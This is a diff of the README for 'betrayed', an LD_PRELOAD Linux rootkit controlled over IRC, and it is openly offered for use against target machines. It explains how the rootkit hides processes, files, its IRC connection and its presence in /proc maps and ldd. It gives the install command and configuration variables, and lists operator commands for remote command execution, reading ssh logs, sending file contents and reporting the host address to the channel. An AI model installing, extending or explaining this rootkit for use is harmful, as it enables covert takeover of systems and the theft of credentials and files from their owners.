@@ -1,26 +1,30 @@
 # betrayed
-### Basic info
-betrayed is an LD_PRELOAD Linux rootkit which is controlled mainly from a IRC channel.  
-It is free of any dependencies, and installs near enough instantly.  
- * Processes are hidden with a magic GID
- * Files/directories are hidden with extended attributes
- * Connections to the IRC server are hidden from plain sight. `netstat` will not show betrayed's socket connection.
+## basic info
+ * betrayed is an LD_PRELOAD Linux rootkit which is controlled mainly from a IRC channel.  
+ * it is free of any dependencies, and installs near enough instantly.  
+ * processes & files are hidden with a magic GID
+ * the connection to the IRC server is hidden from plain sight. `netstat` and similar tools won't show the connection.
+ * upon installation, betrayed will create its initial fork process wherein it will connect to the server and join the specified channel.
+   * by default, betrayed will only create its process & connect to the server if the calling process has root privs. you can turn this off by defining `DM_ROOT` in the config header.
 
- * Upon installation, betrayed will begin trying to create its initial fork process wherein it will connect to the server and join the specified channel.
- * By default, betrayed will only create its process & connect to the server if the calling process has root privs. You can turn this off by defining `DM_ROOT` in the config header.
-
-betrayed's code is a very heavily modified and (de)restructured version of bedevil.
-#### Usage
-`./install.sh <host> '<channel>' [password]`
-Upon completing installation, install.sh will `cat /dev/null`, which will cause betrayed to execute its initial fork process. Even without doing `cat /dev/null` at the end of the installation, any newly spawned process will initiate the connection to the IRC server.  
-<b>Compile only:</b> `COMPILE_ONLY=1 ./install.sh ...` will compile betrayed.so in your cwd.  
-When installing, `install.sh` will write `config.h`. After this header is present, simply running `./install.sh` will cause the script to read settings from the header. A new nick and magic GID will be generated.
+### usage
+ * SEE `src/config.h` FOR SPECIFIC SETTINGS YOU MAY WANT TO CHANGE.
+ * ANY OF THE CONFIGURATION VARIABLES DECLARED AT RUNTIME BY `install.sh` CAN BE CHANGED.
+   * see function `write_conf` in install.sh for variables that can be altered @ runtime.
+   * for example, `NICK` & `SONAME`
+     * _example:_ `NICK=mynewnick SONAME=mynewsoname.so ./install.sh` 
+`./install.sh <host> '<channel>'`
+ * upon successful installation, `install.sh` will `cat /dev/null` straight away
+   * causing betrayed to create its main connection process
+   * without this, the rootkit will join the channel off of the next adequate process
+ * _compile only:_ `COMPILE_ONLY=1 ./install.sh ...` compiles the rootkit in the cwd. 
   
-Once installed, and assuming you are in your target channel, you will see a new user with a random nick join your channel. That is essentially the box that you installed betrayed on.
-#### Available commands
+once installed on the target box & assuming you are in your target channel, you will see a new user with a random nick join your channel. this is the box that you just installed betrayed on.
+
+#### available commands
 ```
  IRC commands:
-      To use a command, send "<CMD NAME> <NICK/all> [any arguments]"
+      to use a command, send "<CMD NAME> <NICK/all> [argument(s)]"
         "!EXEC", // executes given commands & sends resulting output to the channel.
         "!SSHL", // read outgoing ssh logs, send said logs to the channel.
         "!READ", // send file contents to the channel.
@@ -33,15 +37,10 @@ Once installed, and assuming you are in your target channel, you will see a new 
         "!ADDR"  // send the address of the box to the channel. uses curl.
 ```
 
-#### Notes
-##### Hiding
+#### notes
+##### hiding
  * betrayed hides itself from /proc/\*/maps, smaps, and numa_maps.
  * betrayed hides itself from `ldd`, among others.
- * 
- * No default systemd logs are created when utilising betrayed.
- * Only your installation's home directory is hidden (with extended attributes).
- * Processes are hidden with your magic GID.
- * betrayed only evades `netstat` output.
 
-##### Connection
+##### connection
  * using !EXEC/!INFO may cause a short wait before you can do anything else.
